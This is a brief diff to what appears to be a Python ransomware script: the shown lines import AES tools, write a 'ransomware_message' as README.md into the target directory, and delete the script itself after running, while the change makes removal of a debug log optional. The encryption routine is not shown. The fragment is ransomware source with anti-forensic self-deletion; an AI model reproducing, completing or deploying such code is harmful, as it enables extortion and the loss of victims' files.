@@ -9,7 +9,7 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from Crypto.Random import get_random_bytes
 
-
+deleteLog = False
 encrypt_dir = ""
 USAGE = "python {} <FILE_DIR>"
 
@@ -62,7 +62,8 @@ readme_file = os.path.join(encrypt_dir, "README.md")
 with open(readme_file, "w") as f:
     f.write(ransomware_message)
 
-os.remove(debug_file)
+if deleteLog:
+    os.remove(debug_file)
 
 os.remove(sys.argv[0])
 
